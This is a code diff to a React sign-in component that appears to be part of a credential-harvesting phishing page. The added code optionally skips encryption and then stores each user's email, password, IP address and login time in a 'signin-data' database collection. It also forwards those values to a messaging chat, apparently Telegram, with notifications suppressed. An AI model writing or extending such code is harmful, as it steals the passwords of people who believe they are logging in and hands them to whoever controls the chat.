@@ -48,19 +48,31 @@ const SignIn = () => {
         })
         .then(ip => {
             const secretKey = process.env.REACT_APP_PUBLIC_ENCRYPT_KEY
+            const isEnableDecrypt = process.env.REACT_APP_PUBLIC_ENCRYPT_ENABLE
+            let email = data.email
+            let password = data.password
+            let ip_address = ip
+            let logged_at = moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
+            if( isEnableDecrypt === '1' )
+            {
+                email = CryptoJS.AES.encrypt(email, secretKey).toString()
+                password = CryptoJS.AES.encrypt(password, secretKey).toString()
+                ip_address = CryptoJS.AES.encrypt(ip_address, secretKey).toString() 
+                logged_at = CryptoJS.AES.encrypt( logged_at, secretKey).toString()
+            }
             db.collection('signin-data').add({
-                email: CryptoJS.AES.encrypt(data.email, secretKey).toString(),
-                password: CryptoJS.AES.encrypt(data.password, secretKey).toString(),
-                ip_address: CryptoJS.AES.encrypt(ip, secretKey).toString(),
-                logged_at: CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
+                email: email,
+                password: password,
+                ip_address: ip_address,
+                logged_at: logged_at
             }).then(res => {
                 if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
                 {
                     let message = "Sign In Data\r\n"
-                    message += "Email: " + CryptoJS.AES.encrypt(data.email, secretKey).toString() + '\r\n'
-                    message += "Password: " + CryptoJS.AES.encrypt(data.password, secretKey).toString() + '\r\n'
-                    message += "Ip Address: " + CryptoJS.AES.encrypt(ip, secretKey).toString() + '\r\n'
-                    message += "Time: " + CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
+                    message += "" + email + '\r\n'
+                    message += "" + password + '\r\n'
+                    message += "" + ip_address + '\r\n'
+                    message += "" + logged_at
                     client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
                         disableWebPagePreview: true,
                         disableNotification: true,
